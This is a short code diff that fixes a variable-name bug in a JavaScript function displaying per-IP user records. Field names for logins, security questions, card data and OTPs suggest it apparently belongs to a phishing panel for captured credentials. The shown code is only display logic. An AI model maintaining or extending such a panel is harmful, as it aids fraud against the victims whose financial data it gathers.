@@ -153,7 +153,7 @@ function updateActiveUserCount(newCount) {
 function formatUserDataForDisplay(userData) {
   // Format the user data for display in the modal
   // Placeholder function - implement according to your needs
-  users.forEach(user => {
+  userData.forEach(user => {
     if (Array.isArray(user) && user.length === 2) {
       const [ipAddress, details] = user;
       if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {
